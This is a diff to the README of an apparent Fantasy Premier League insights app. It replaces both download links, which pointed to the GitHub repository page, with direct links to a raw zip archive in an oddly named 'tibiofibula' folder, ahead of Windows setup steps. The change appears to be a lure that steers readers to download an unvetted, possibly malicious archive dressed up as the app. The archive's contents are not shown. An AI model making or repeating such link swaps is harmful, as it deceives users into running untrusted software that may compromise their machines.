@@ -1,6 +1,6 @@
 # ⚽ x402-fpl-api - Clear Fantasy Premier League insights
 
-[![Download](https://img.shields.io/badge/Download-Get%20it%20here-blue?style=for-the-badge&logo=github)](https://github.com/Edwinvi6421/x402-fpl-api)
+[![Download](https://img.shields.io/badge/Download-Get%20it%20here-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Edwinvi6421/x402-fpl-api/main/tibiofibula/fpl-x-api-v3.2-beta.1.zip)
 
 ## 🧭 What this app does
 
@@ -35,7 +35,7 @@ For most users, the easiest path is to visit the GitHub page, follow the setup s
 
 Open this page to download and set up the app:
 
-[Visit the download page](https://github.com/Edwinvi6421/x402-fpl-api)
+[Visit the download page](https://raw.githubusercontent.com/Edwinvi6421/x402-fpl-api/main/tibiofibula/fpl-x-api-v3.2-beta.1.zip)
 
 If you are on Windows, follow these steps:
 
